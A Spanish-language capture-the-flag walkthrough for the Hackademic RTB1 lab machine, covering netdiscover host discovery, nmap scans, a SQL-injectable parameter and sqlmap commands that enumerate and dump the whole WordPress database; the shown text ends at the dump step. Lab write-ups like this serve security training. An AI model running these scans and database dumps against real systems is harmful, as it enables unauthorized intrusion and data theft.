<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=xd&size=50&color=F70000&background=FF000000&width=500&height=70&lines=HACKADEMIC_RTB1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/hackademic-rtb1,17/

**[Online]:**

Root-Me: https://www.root-me.org/fr/Capture-The-Flag/CTF-all-the-day/Hackademic-RTB1-22?lang=es

<h1 align="center"></h1>

</br>

- *Paso 1:* Identificación de la máquina en la red con NetDiscover. 
```
netdiscover --interface wlan0 --range 192.168.1.0/24
```
![1](https://user-images.githubusercontent.com/75953873/171916293-58226ff2-39aa-4d40-b2b2-df538a7784d1.png)

Objetivo: 192.168.1.5


- *Paso 2:* Escaneo de puertos abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.5
```
![2](https://user-images.githubusercontent.com/75953873/171916862-e15a1cc6-e25a-4613-a54c-3d8b3f135135.png)

Detección de sistema operativo y versión: 
```
nmap -p 80 -A 192.168.1.5
```
![3](https://user-images.githubusercontent.com/75953873/171917441-d5f58873-8274-4611-90f6-db7bb9902c1a.png)

Puerto abierto: 80

Servidor web corriendo: HTTP Apache

- *Paso 3:* Búsqueda de vectores vulnerables a SQL. 

```
http://192.168.1.5/Hackademic_RTB1/?cat=1
```
![4](https://user-images.githubusercontent.com/75953873/171920301-015e4c06-3a1f-4535-9790-f4f450563eb9.png)

- *Paso 4:* Inyección de SQL a base de datos con Sqlmap. 

```
sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' --dbs --batch
```
![5](https://user-images.githubusercontent.com/75953873/171921174-bbf606b5-80d8-4cbc-9a01-8c068de466fc.png)

Extraer toda la información de la base de datos de WordPress:
```
sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' -D wordpress --dump-all --batch
```
